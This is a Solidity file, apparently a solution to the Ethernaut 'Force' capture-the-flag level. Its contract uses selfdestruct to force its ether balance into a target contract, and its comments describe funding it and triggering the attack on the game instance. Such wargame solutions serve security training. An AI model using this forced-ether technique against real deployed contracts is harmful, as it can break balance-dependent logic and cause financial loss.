/*
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Force {
    function accept(uint256 _amount) external payable returns (uint256) {
        return address(this).balance;
    }

    function sendIt(address _address) external {
        // Kill contract and force entire balance into _address
        selfdestruct(payable(_address)); 
    }
}
*/

//Entire file commented to prevent compiler version and import errors. This contract was deployed using remix browser editor.
//Deployed on remix. You must fund the contract using the accept() function.
//Attack initiated by calling the sendIt function and passing in ethernaut instance address. By killing this contract it forces funds into the ethernaut instance.